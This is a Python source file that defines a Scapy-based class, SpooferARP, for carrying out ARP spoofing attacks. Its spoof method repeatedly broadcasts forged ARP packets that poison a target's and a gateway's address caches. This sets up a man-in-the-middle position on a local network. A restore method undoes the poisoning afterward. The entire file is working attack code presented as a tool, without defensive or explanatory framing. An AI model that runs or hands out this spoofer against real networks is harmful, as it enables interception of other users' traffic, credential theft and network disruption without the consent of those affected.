# -*- coding: utf-8 -*-
from scapy.all import Ether, ARP, srp, sendp, get_if_addr, conf, RandMAC, getmacbyip, get_if_hwaddr
from time import sleep
import platform, logging


class SpooferARP:
    """ This class implement a arp spoofer. """

    def __init__(self, ip_target, ip_spoof, semi=False, inter=0.5):
        self.semi = semi
        self.inter = inter
        self.ip_target = ip_target
        self.ip_spoof = ip_spoof
        self.my_ip = get_if_addr(conf.iface)
        self.my_mac = get_if_hwaddr(conf.iface)
        self.target_mac = getmacbyip(self.ip_target)
        self.mac_spoof = getmacbyip(self.ip_spoof)
        self.run = True
        

    def launch(self):
        """ The "main" function for arp spoof. """
        
        logging.info(f"Your address is {self.my_ip} ({self.my_mac})")
        logging.warning(f'Start ARP spoof between {self.ip_target} ({self.target_mac}) and {self.ip_spoof} ({self.mac_spoof}).')
        
        while self.run:
            self.spoof()
            sleep(self.inter)
        self.restore()
        logging.warning("ARP spoofer is closed.")

    def spoof(self):
        """ This function send spooffed packets. """

        sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.ip_target, psrc=self.ip_spoof), verbose=0)
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=self.my_mac) / ARP(pdst=self.ip_target, psrc=self.my_ip,
                                                                    hwsrc=self.my_mac), verbose=0)
        if not self.semi: sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.ip_spoof, psrc=self.ip_target),
                                verbose=0)

    def restore(self):
        """ This function restore real address after spoof attack. """
        print("Attack Restored!")

        sendp(Ether(src=self.mac_spoof, dst=self.target_mac) / ARP(pdst=self.ip_target, psrc=self.ip_spoof),
              inter=0.5, count=7, verbose=0)
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.ip_target, psrc=self.my_ip), verbose=0, inter=0.5, count=7)
        if not self.semi: sendp(Ether(src=self.target_mac, dst=self.mac_spoof) / ARP(pdst=self.ip_spoof,
                                                                                     psrc=self.ip_target), inter=0.5,
                                count=7, verbose=0)
